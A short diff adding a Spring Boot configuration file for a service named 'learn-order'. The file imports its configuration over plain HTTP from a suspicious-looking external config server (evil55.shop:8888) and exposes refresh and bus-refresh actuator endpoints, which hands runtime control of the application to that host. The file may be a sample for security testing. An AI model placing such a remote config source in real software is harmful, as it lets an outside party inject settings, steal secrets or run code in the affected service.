@@ -1,0 +1,19 @@
+
+spring:
+  application:
+    name: learn-order
+  config:
+    import: optional:configserver:http://evil55.shop:8888
+
+management:
+  endpoints:
+    web:
+      exposure:
+        include:
+          - refresh
+          - health
+          - info
+          - bus-refresh
+          - info
+          - metrics
+          - prometheus
